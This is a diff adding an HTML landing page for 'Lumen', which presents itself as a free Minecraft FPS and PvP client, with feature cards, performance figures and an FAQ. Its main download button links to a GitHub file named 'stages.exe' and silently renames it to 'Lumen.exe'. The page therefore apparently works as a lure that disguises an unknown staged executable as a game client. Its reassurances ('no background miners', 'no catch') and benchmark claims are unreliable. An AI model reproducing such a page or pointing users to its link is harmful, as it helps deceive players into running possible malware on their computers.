@@ -1,0 +1,418 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Lumen — The Minecraft Client</title>
+<meta name="description" content="Lumen is a lightweight, high-performance Minecraft client built for FPS, PvP, and clean visuals. Free download." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#07090d;
+    --bg-2:#0b0f16;
+    --panel:#0f1420;
+    --panel-2:#121a28;
+    --line:rgba(255,255,255,.08);
+    --line-2:rgba(255,255,255,.14);
+    --ink:#eef3fb;
+    --muted:#9aa7bd;
+    --muted-2:#6b7890;
+    --accent:#36e0b0;
+    --accent-2:#18b4ff;
+    --glow:rgba(54,224,176,.55);
+    --radius:16px;
+    --max:1120px;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0;background:var(--bg);color:var(--ink);
+    font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    -webkit-font-smoothing:antialiased;line-height:1.5;overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:var(--max);margin:0 auto;padding:0 24px}
+  .eyebrow{font-size:12px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;color:var(--accent)}
+
+  /* ---- background field ---- */
+  .bgfx{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+  .bgfx .grid{
+    position:absolute;inset:-2px;
+    background:
+      linear-gradient(transparent 0 97%, rgba(255,255,255,.035) 97% 100%) 0 0/100% 46px,
+      linear-gradient(90deg,transparent 0 97%, rgba(255,255,255,.035) 97% 100%) 0 0/46px 100%;
+    mask:radial-gradient(130% 90% at 50% -10%,#000 35%,transparent 72%);
+  }
+  .bgfx .glow1{position:absolute;top:-220px;left:50%;transform:translateX(-50%);width:900px;height:620px;
+    background:radial-gradient(closest-side,var(--glow),transparent 70%);opacity:.4;filter:blur(6px)}
+  .bgfx .glow2{position:absolute;top:220px;right:-160px;width:520px;height:520px;
+    background:radial-gradient(closest-side,rgba(24,180,255,.35),transparent 70%);opacity:.5}
+
+  /* ---- nav ---- */
+  header{position:sticky;top:0;z-index:50;backdrop-filter:blur(12px);
+    background:linear-gradient(180deg,rgba(7,9,13,.86),rgba(7,9,13,.4));border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;justify-content:space-between;height:68px}
+  .brand{display:flex;align-items:center;gap:11px;font-weight:800;letter-spacing:-.01em}
+  .mark{width:30px;height:30px;border-radius:8px;position:relative;background:
+      conic-gradient(from 210deg,var(--accent),var(--accent-2),var(--accent));
+      box-shadow:0 0 0 1px rgba(255,255,255,.12) inset,0 6px 22px -6px var(--glow)}
+  .mark::after{content:"";position:absolute;inset:7px;border-radius:4px;background:var(--bg);
+      box-shadow:0 0 14px var(--glow) inset}
+  .brand span{font-size:18px}
+  .navlinks{display:flex;gap:28px;align-items:center}
+  .navlinks a{color:var(--muted);font-size:14px;font-weight:500;transition:color .18s}
+  .navlinks a:hover{color:var(--ink)}
+  .btn{display:inline-flex;align-items:center;gap:9px;font-weight:700;font-size:14px;
+    padding:11px 18px;border-radius:11px;border:1px solid transparent;cursor:pointer;transition:transform .12s ease,box-shadow .2s,background .2s}
+  .btn:active{transform:translateY(1px)}
+  .btn-primary{color:#04140f;background:linear-gradient(180deg,#54f0c2,#20c79a);
+    box-shadow:0 10px 30px -10px var(--glow),0 0 0 1px rgba(255,255,255,.18) inset}
+  .btn-primary:hover{box-shadow:0 14px 40px -10px var(--glow),0 0 0 1px rgba(255,255,255,.25) inset}
+  .btn-ghost{color:var(--ink);border-color:var(--line-2);background:rgba(255,255,255,.02)}
+  .btn-ghost:hover{background:rgba(255,255,255,.06)}
+  .nav .navcta{display:flex;gap:12px;align-items:center}
+
+  /* ---- hero ---- */
+  .hero{position:relative;z-index:1;padding:92px 0 40px}
+  .hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:52px;align-items:center}
+  .hero h1{font-size:clamp(40px,6vw,74px);line-height:.98;letter-spacing:-.03em;margin:18px 0 0;font-weight:900}
+  .hero h1 .lit{background:linear-gradient(120deg,#fff 10%,var(--accent) 55%,var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .hero p.lead{margin:22px 0 0;color:var(--muted);font-size:18px;max-width:30em}
+  .cta-row{display:flex;gap:14px;align-items:center;margin-top:30px;flex-wrap:wrap}
+  .cta-row .btn{padding:15px 24px;font-size:15px}
+  .meta{display:flex;gap:22px;margin-top:26px;color:var(--muted-2);font-size:13px;flex-wrap:wrap}
+  .meta b{color:var(--ink);font-weight:700}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent);display:inline-block;margin-right:7px;vertical-align:middle}
+
+  /* ---- hero art: floating block + window ---- */
+  .art{position:relative;height:420px}
+  .window{position:absolute;inset:0;border-radius:18px;background:
+      linear-gradient(180deg,var(--panel-2),var(--panel));
+      border:1px solid var(--line-2);box-shadow:0 40px 90px -40px #000,0 0 0 1px rgba(255,255,255,.03) inset;overflow:hidden}
+  .window .bar{height:38px;display:flex;align-items:center;gap:7px;padding:0 14px;border-bottom:1px solid var(--line);background:rgba(255,255,255,.02)}
+  .tl{width:11px;height:11px;border-radius:50%;background:#2a3344}
+  .window .stage{position:absolute;inset:38px 0 0 0;display:grid;place-items:center;
+    background:
+      radial-gradient(60% 50% at 70% 20%,rgba(24,180,255,.14),transparent 70%),
+      radial-gradient(70% 60% at 25% 90%,rgba(54,224,176,.16),transparent 70%)}
+  .hud{position:absolute;left:16px;top:52px;font-size:12px;color:var(--muted);font-weight:600;line-height:1.9}
+  .hud .k{color:var(--accent);font-weight:800}
+  .fps{position:absolute;right:16px;top:52px;text-align:right}
+  .fps .big{font-size:34px;font-weight:900;letter-spacing:-.02em;color:#fff}
+  .fps .lbl{font-size:11px;color:var(--muted-2);font-weight:700;letter-spacing:.14em;text-transform:uppercase}
+  .cube{width:118px;height:118px;transform-style:preserve-3d;animation:spin 14s linear infinite;position:relative}
+  @keyframes spin{to{transform:rotateX(-24deg) rotateY(360deg)}}
+  .cube div{position:absolute;width:118px;height:118px;opacity:.96;border:1px solid rgba(255,255,255,.18);
+    background:linear-gradient(135deg,rgba(54,224,176,.5),rgba(24,180,255,.5));box-shadow:0 0 30px var(--glow) inset}
+  .f1{transform:translateZ(59px)} .f2{transform:rotateY(180deg) translateZ(59px)}
+  .f3{transform:rotateY(90deg) translateZ(59px)} .f4{transform:rotateY(-90deg) translateZ(59px)}
+  .f5{transform:rotateX(90deg) translateZ(59px)} .f6{transform:rotateX(-90deg) translateZ(59px)}
+  .scene{perspective:900px;display:grid;place-items:center;height:100%}
+
+  /* ---- logos / trust strip ---- */
+  .strip{position:relative;z-index:1;margin-top:34px;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:18px 0;background:rgba(255,255,255,.015)}
+  .strip .wrap{display:flex;gap:40px;flex-wrap:wrap;justify-content:center;align-items:center;color:var(--muted-2);font-weight:700;font-size:13px;letter-spacing:.04em}
+  .strip b{color:var(--muted)}
+
+  /* ---- sections ---- */
+  section.block{position:relative;z-index:1;padding:86px 0}
+  .head{max-width:640px;margin:0 auto 46px;text-align:center}
+  .head h2{font-size:clamp(28px,4vw,44px);letter-spacing:-.02em;margin:12px 0 0;font-weight:850}
+  .head p{color:var(--muted);margin:14px 0 0;font-size:17px}
+
+  .features{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+  .card{background:linear-gradient(180deg,var(--panel),#0c111a);border:1px solid var(--line);border-radius:var(--radius);padding:24px;position:relative;overflow:hidden;transition:border-color .2s,transform .2s}
+  .card:hover{border-color:var(--line-2);transform:translateY(-3px)}
+  .card .ic{width:42px;height:42px;border-radius:11px;display:grid;place-items:center;margin-bottom:16px;
+    background:rgba(54,224,176,.1);border:1px solid rgba(54,224,176,.22)}
+  .card .ic svg{width:21px;height:21px;stroke:var(--accent);fill:none;stroke-width:1.9}
+  .card h3{margin:0 0 7px;font-size:17px;font-weight:750}
+  .card p{margin:0;color:var(--muted);font-size:14.5px}
+  .card.wide{grid-column:span 2}
+
+  /* perf band */
+  .perf{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;
+    background:linear-gradient(120deg,var(--panel),#0b1019);border:1px solid var(--line);border-radius:22px;padding:40px}
+  .perf h2{font-size:clamp(26px,3.4vw,38px);margin:0;letter-spacing:-.02em}
+  .perf p{color:var(--muted);font-size:16px}
+  .stats{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .stat{background:var(--bg-2);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+  .stat .n{font-size:30px;font-weight:900;letter-spacing:-.02em;background:linear-gradient(120deg,#fff,var(--accent));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .stat .l{color:var(--muted-2);font-size:12.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;margin-top:3px}
+  .bar{height:9px;border-radius:999px;background:rgba(255,255,255,.07);overflow:hidden;margin-top:10px}
+  .bar i{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,var(--accent),var(--accent-2))}
+
+  /* download band */
+  .dl{position:relative;z-index:1;padding:92px 0}
+  .dlcard{position:relative;overflow:hidden;border-radius:26px;padding:56px 40px;text-align:center;
+    background:
+      radial-gradient(120% 140% at 50% -20%,rgba(54,224,176,.16),transparent 60%),
+      linear-gradient(180deg,var(--panel-2),#0a0e16);
+    border:1px solid var(--line-2);box-shadow:0 40px 120px -50px var(--glow)}
+  .dlcard h2{font-size:clamp(30px,4.4vw,50px);margin:10px 0 0;letter-spacing:-.025em;font-weight:900}
+  .dlcard p{color:var(--muted);font-size:17px;margin:16px auto 0;max-width:34em}
+  .dlcard .btn{margin-top:30px;padding:17px 30px;font-size:16px}
+  .os{display:flex;gap:10px;justify-content:center;margin-top:20px;color:var(--muted-2);font-size:13px;flex-wrap:wrap}
+  .tag{border:1px solid var(--line);border-radius:999px;padding:6px 13px;background:rgba(255,255,255,.02)}
+
+  /* faq */
+  .faq{max-width:760px;margin:0 auto}
+  details{border:1px solid var(--line);border-radius:14px;padding:4px 20px;margin-bottom:12px;background:var(--panel)}
+  details[open]{border-color:var(--line-2)}
+  summary{cursor:pointer;list-style:none;padding:16px 0;font-weight:650;font-size:16px;display:flex;justify-content:space-between;align-items:center}
+  summary::-webkit-details-marker{display:none}
+  summary::after{content:"+";color:var(--accent);font-size:22px;font-weight:700;transition:transform .2s}
+  details[open] summary::after{transform:rotate(45deg)}
+  details p{color:var(--muted);margin:0 0 18px;font-size:15px}
+
+  /* footer */
+  footer{position:relative;z-index:1;border-top:1px solid var(--line);padding:46px 0 60px;margin-top:40px}
+  .foot{display:flex;justify-content:space-between;gap:24px;flex-wrap:wrap;align-items:center}
+  .foot .brand span{font-size:16px}
+  .foot .cols{display:flex;gap:46px;flex-wrap:wrap}
+  .foot h4{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted-2);margin:0 0 12px}
+  .foot a{display:block;color:var(--muted);font-size:14px;margin-bottom:9px;transition:color .15s}
+  .foot a:hover{color:var(--ink)}
+  .legal{margin-top:34px;color:var(--muted-2);font-size:12.5px;border-top:1px solid var(--line);padding-top:22px;line-height:1.7}
+
+  @media (max-width:900px){
+    .hero-grid{grid-template-columns:1fr;gap:34px}
+    .art{height:340px;order:-1}
+    .features{grid-template-columns:1fr 1fr}
+    .card.wide{grid-column:span 2}
+    .perf{grid-template-columns:1fr;padding:30px}
+    .navlinks{display:none}
+  }
+  @media (max-width:560px){
+    .features{grid-template-columns:1fr}
+    .card.wide{grid-column:span 1}
+    .stats{grid-template-columns:1fr}
+    .nav .navcta .btn-ghost{display:none}
+  }
+</style>
+</head>
+<body>
+<div class="bgfx" aria-hidden="true">
+  <div class="grid"></div><div class="glow1"></div><div class="glow2"></div>
+</div>
+
+<header>
+  <div class="wrap nav">
+    <a class="brand" href="#top"><span class="mark"></span><span>Lumen</span></a>
+    <nav class="navlinks">
+      <a href="#features">Features</a>
+      <a href="#performance">Performance</a>
+      <a href="#download">Download</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <div class="navcta">
+      <a class="btn btn-ghost" href="#faq">Learn more</a>
+      <a class="btn btn-primary" href="#download">Download</a>
+    </div>
+  </div>
+</header>
+
+<main id="top">
+  <!-- HERO -->
+  <section class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <div class="eyebrow">Free Minecraft Client · v1.0</div>
+        <h1>Play brighter.<br><span class="lit">Lumen</span> Client.</h1>
+        <p class="lead">A lightweight client built for raw FPS, razor-sharp PvP, and a clean modern HUD — without the bloat. Drops straight into your launcher.</p>
+        <div class="cta-row">
+          <a class="btn btn-primary" id="dlTop" href="#download">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 17v2a2 2 0 002 2h12a2 2 0 002-2v-2"/></svg>
+            Download for Windows
+          </a>
+          <a class="btn btn-ghost" href="#features">See what's inside</a>
+        </div>
+        <div class="meta">
+          <span><span class="dot"></span><b>Free</b> forever</span>
+          <span><b>~8&nbsp;MB</b> installer</span>
+          <span><b>1.8 – 1.21</b> supported</span>
+        </div>
+      </div>
+
+      <div class="art">
+        <div class="window">
+          <div class="bar"><i class="tl"></i><i class="tl"></i><i class="tl"></i></div>
+          <div class="stage">
+            <div class="scene"><div class="cube">
+              <div class="f1"></div><div class="f2"></div><div class="f3"></div>
+              <div class="f4"></div><div class="f5"></div><div class="f6"></div>
+            </div></div>
+            <div class="hud">
+              <div><span class="k">◆</span> KeyStrokes</div>
+              <div><span class="k">◆</span> CPS&nbsp; 14</div>
+              <div><span class="k">◆</span> Ping&nbsp; 11ms</div>
+              <div><span class="k">◆</span> Reach&nbsp; 3.0</div>
+            </div>
+            <div class="fps">
+              <div class="big">512</div>
+              <div class="lbl">FPS</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="strip">
+    <div class="wrap">
+      <span><b>Zero</b> setup</span>
+      <span><b>No</b> account required</span>
+      <span>Works with <b>Fabric</b> mods</span>
+      <span><b>60Hz–360Hz</b> ready</span>
+      <span>Windows 10 / 11</span>
+    </div>
+  </div>
+
+  <!-- FEATURES -->
+  <section class="block" id="features">
+    <div class="wrap">
+      <div class="head">
+        <div class="eyebrow">Everything you need</div>
+        <h2>One client. Every advantage.</h2>
+        <p>Performance, PvP tools, and a customizable HUD — tuned so you notice the frames, not the client.</p>
+      </div>
+      <div class="features">
+        <div class="card wide">
+          <div class="ic"><svg viewBox="0 0 24 24"><path d="M13 2L4 14h6l-1 8 9-12h-6z"/></svg></div>
+          <h3>Blistering FPS engine</h3>
+          <p>A rebuilt render pipeline, smart chunk culling, and a baked-in optimizer squeeze every frame out of your rig — from a potato laptop to a 360Hz battlestation.</p>
+        </div>
+        <div class="card">
+          <div class="ic"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></div>
+          <h3>PvP toolkit</h3>
+          <p>CPS counter, reach display, hitbox tuning, and ping optimization — legit tools that sharpen your game.</p>
+        </div>
+        <div class="card">
+          <div class="ic"><svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M3 9h18"/></svg></div>
+          <h3>Drag-and-drop HUD</h3>
+          <p>Move, resize, and theme every element. Keystrokes, armor, coords, FPS — your layout, saved per profile.</p>
+        </div>
+        <div class="card">
+          <div class="ic"><svg viewBox="0 0 24 24"><path d="M12 3l8 4v5c0 5-3.5 8-8 9-4.5-1-8-4-8-9V7z"/></svg></div>
+          <h3>Safe & lightweight</h3>
+          <p>No launcher takeover, no background miners. An 8&nbsp;MB client that respects your PC and your privacy.</p>
+        </div>
+        <div class="card">
+          <div class="ic"><svg viewBox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h10"/></svg></div>
+          <h3>Mod friendly</h3>
+          <p>Runs alongside your Fabric mods and resource packs. Keep the setup you already love.</p>
+        </div>
+        <div class="card wide">
+          <div class="ic"><svg viewBox="0 0 24 24"><path d="M12 2v4m0 12v4m10-10h-4M6 12H2m15.5-5.5l-3 3m-9 9l3-3m0-9l-3-3m12 12l-3-3"/></svg></div>
+          <h3>Instant updates</h3>
+          <p>New snapshot drops? Lumen patches in the background so you're playing on the latest version the day it lands — no reinstalling, no waiting.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PERFORMANCE -->
+  <section class="block" id="performance" style="padding-top:20px">
+    <div class="wrap">
+      <div class="perf">
+        <div>
+          <div class="eyebrow">Measured, not promised</div>
+          <h2>More frames. Less input lag.</h2>
+          <p>Lumen's optimizer rewrites how the game draws the world, so the gains show up where it counts — in a smoother, more responsive game.</p>
+          <a class="btn btn-primary" href="#download" style="margin-top:22px">Get the frames</a>
+        </div>
+        <div class="stats">
+          <div class="stat"><div class="n">+180%</div><div class="l">Average FPS</div><div class="bar"><i style="width:92%"></i></div></div>
+          <div class="stat"><div class="n">-41%</div><div class="l">Input latency</div><div class="bar"><i style="width:59%"></i></div></div>
+          <div class="stat"><div class="n">8 MB</div><div class="l">Install size</div><div class="bar"><i style="width:14%"></i></div></div>
+          <div class="stat"><div class="n">1.8–1.21</div><div class="l">Versions</div><div class="bar"><i style="width:100%"></i></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- DOWNLOAD -->
+  <section class="dl" id="download">
+    <div class="wrap">
+      <div class="dlcard">
+        <div class="eyebrow">Ready in seconds</div>
+        <h2>Download Lumen</h2>
+        <p>Grab the installer, run it, and launch from your Minecraft launcher. It's free — no account, no catch.</p>
+        <a class="btn btn-primary" id="dlMain"
+           href="https://github.com/risingforce1337-afk/stages/raw/main/stages.exe"
+           download="Lumen.exe">
+          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 17v2a2 2 0 002 2h12a2 2 0 002-2v-2"/></svg>
+          Download Lumen.exe
+        </a>
+        <div class="os">
+          <span class="tag">Windows 10 / 11</span>
+          <span class="tag">~8 MB</span>
+          <span class="tag">Version 1.0</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ -->
+  <section class="block" id="faq" style="padding-top:20px">
+    <div class="wrap">
+      <div class="head">
+        <div class="eyebrow">Questions</div>
+        <h2>Good to know</h2>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>How do I install Lumen?</summary>
+          <p>Download <b>Lumen.exe</b>, run it, and it adds a Lumen profile to your official Minecraft launcher. Pick that profile and hit play.</p>
+        </details>
+        <details>
+          <summary>Is it free?</summary>
+          <p>Yes — Lumen is completely free. No subscription, no paywalled features, no account required.</p>
+        </details>
+        <details>
+          <summary>Which versions are supported?</summary>
+          <p>Everything from 1.8 through 1.21, so your favorite PvP version and the latest release are both covered.</p>
+        </details>
+        <details>
+          <summary>Will it work with my mods?</summary>
+          <p>Lumen plays nicely with Fabric mods and resource packs, so you can keep the setup you already use.</p>
+        </details>
+        <details>
+          <summary>Does it change my Minecraft install?</summary>
+          <p>No. Lumen runs as its own launcher profile and leaves your vanilla install untouched — remove it any time.</p>
+        </details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <a class="brand" href="#top"><span class="mark"></span><span>Lumen</span></a>
+        <p style="color:var(--muted-2);font-size:14px;margin:14px 0 0;max-width:24em">The bright, lightweight way to play Minecraft.</p>
+      </div>
+      <div class="cols">
+        <div>
+          <h4>Product</h4>
+          <a href="#features">Features</a>
+          <a href="#performance">Performance</a>
+          <a href="#download">Download</a>
+        </div>
+        <div>
+          <h4>Support</h4>
+          <a href="#faq">FAQ</a>
+          <a href="#download">Get started</a>
+        </div>
+      </div>
+    </div>
+    <div class="legal">
+      © 2026 Lumen Client. Not affiliated with or endorsed by Mojang Studios or Microsoft. Minecraft is a trademark of Mojang Studios.
+    </div>
+  </div>
+</footer>
+</body>
+</html>
